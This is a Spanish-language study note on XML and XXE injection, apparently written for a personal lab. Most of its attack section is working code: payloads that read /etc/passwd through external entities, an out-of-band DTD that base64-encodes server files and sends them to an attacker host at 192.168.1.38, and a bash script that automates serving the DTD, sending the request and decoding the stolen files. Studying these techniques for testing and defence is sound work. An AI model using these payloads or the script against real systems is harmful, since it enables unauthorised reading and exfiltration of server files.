----
- Tags: #ataque #basico #ataques 
----

# ¿ Que es XML?

**XML** es un metalenguaje que permite definir lenguajes de marcas desarrollado por el World Wide Web Consortium utilizado para almacenar datos en forma legible.

XML (E**X**tensible **M**arkup **L**angague) se encarga de almacenar y transportar datos siguiendo una estructura de arbol.
![[xml.png]]

----

# Entidades 

Las **entidades** son una forma de representar a un elemento de datos , sin referenciar a los datos, esto en un documento XML.

Existen entidades **Genericas / Customizadas**, **Externas (XXE)**, **Predefinidas (&lt, &gt)]**. 

----

# ¿ Que es un XXE?

Un **XML External Entitiy Injection** o **XXE**, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a revursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como apliacciones web o servicios web. 

Un ataque **XXE** mayormente implica la inyección en una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servodpr y puede resultar en la xposición de información sensible. Como en la mayoria de vulnerabilidades, esta vulnerabilidad se da cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe.

Con **XXE** no siempre se obtiene una exposición directa de información sensible en la respuesta, si no que aveces el atacante al igual qeu con las [[SQLI - (Inyecciones SQL)]] el atacante debe ir a "**ciegas**" a través de tecnicas adicionales. Esto puede ser más lento y requiere más trabajo que una explotación directa. sin embargo, puede ser efectivo en casos donde el atacante tiene una idea geenral de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado. 

A si tambien, muchas veces el **XXE** puede ser utilizado como un vector de ataque para explotar una vulnerabilidad [[SSRF - (Server-Side Request Forgery)]] para escanear puertos internos.

----

# Ataque 

Por ejemplo, si tuvieramos la sig petición en XML: 

```xml 
<?xml version="1.0" encoding="UTF-8"?>
<root>
	<name>dobliuw</name>
	<tel>11142131241</tel>
	<email>dobliuw@dobliuw.com</email>
	<password>dobliuw123</password>
</root>
```

Jugando con un **DTD** (Document Type Definition) y entidades Externas podemos explotar la vulnerabilidad

```xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY name "dobliuw" >]>
<root>
	<name>dobliuw</name>
	<tel>11142131241</tel>
	<email>&name;</email>
	<password>dobliuw123</password>
</root>
```

En este caso vemos que somos capaces de crear una entidad con `<!DOCTYPE foo [<!ENTITY name "dobliuw" >]>` y  hacer que el valor de tome en donde va el email con `&name`, en este caso es name por que la entidad definida se llama name

```xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd" >]>
<root>
	<name>dobliuw</name>
	<tel>11142131241</tel>
	<email>&myFile;</email>
	<password>dobliuw123</password>
</root>
```

Ahora, esto de llamar la entidad dentro de la estructura xml puede ser que no funcione, por lo que existe el concepto de **XEE OOB Blind (XML External Entity Out of Band a ciegas)** por lo que para explotarla podriamos ver si se logra hacer una petción http a nuestra maquina.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % myFile SYSTEM "http://192.168.1.38" > %myFile; ]>
<root>
	<name>dobliuw</name>
	<tel>12314124</tel>
	<email>dobliuw@dobliuw.com</email>
	<password>dobliuw123</password>
</root>
```

En ese caso, podriamos intentar llamar a un archivo en concreto, por ejemplo un "malicious.dtd" con una estructura de entidades para dumpear archivos del sistema de la maquina, recibiendo los archivos como petición http con su cadena en base64. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % myFile SYSTEM "http://192.168.1.38/malicious.dtd" > %myFile; ]>
<root>
	<name>dobliuw</name>
	<tel>12314124</tel>
	<email>dobliuw@dobliuw.com</email>
	<password>dobliuw123</password>
</root>
```

#### Malicious.dtd:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.38/?file=%file;'>">
%eval;
%exfil; 
```

Y obviamente, explotando nuestras habilidades de atacante, más que claro esta que podriamos crearnos un script en python, bash o cualquier lenguaje para automatizar esto al punto de simplemente escribir un archivo a dumpear y que se dumpee. Asi como tambien es importante tener en cuenta que podriamos realizar un [[SSRF - (Server-Side Request Forgery)]] con las **XXE**. 

```shell
#!/bin/bash 

function ctrl_c(){
	echo -e "\n\n\t[!] Quiting...\n\n"
	kill -9 $PID 
	wait $PID 2>/dev/null 
	/usr/bin/rm -f response
	/usr/bin/rm -f malicious.dtd 
	exit 1 
}

trap ctrl_c SIGINT

if [ $EUID -ne 0 ]; then 
	echo -e "\n\n\t[!] The scrip need runs like root :)\n\n"
else 
  python3 -m http.server 80 &>response &   # Levantamos en segundo plano un servidor http
  PID=$! # Guardamos en la variable PID el PID del proceso para al realizar ctrl c matarlo
  sleep 2 

  while true; do  
  
  echo -ne "\n[!] Introduce el archivo a leer: " && read -r file; # -r para que acepte espacios 
  
  evildtd="""
  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$file\">
  <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.38/?file=%file;'>\">
  %eval;
  %exfil;""" # Estructura maliciosa para lograr el dumpeo de archivos 

  [[ -f "malicious.dtd" ]] && /usr/bin/rm malicious.dtd 
  echo "" > malicious.dtd
  echo $evildtd > malicious.dtd 


  # Automatizamos tambien la petición maliciosa
  /usr/bin/curl -s -X GET "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY % myFile SYSTEM "http://192.168.1.38/malicious.dtd" > %myFile; ]>
  <root><name>dobliuw</name><tel>12314124</tel><email>dobliuw@dobliuw.com</email><password>dobliuw123</password></root>' &>/dev/null 

  echo -e "\n[+] $file : " && /usr/bin/cat response | /usr/bin/tail -n 1 | /usr/bin/grep -oP "/?file=\K[^.*]+" | /usr/bin/base64 -d
  done 
fi 
```
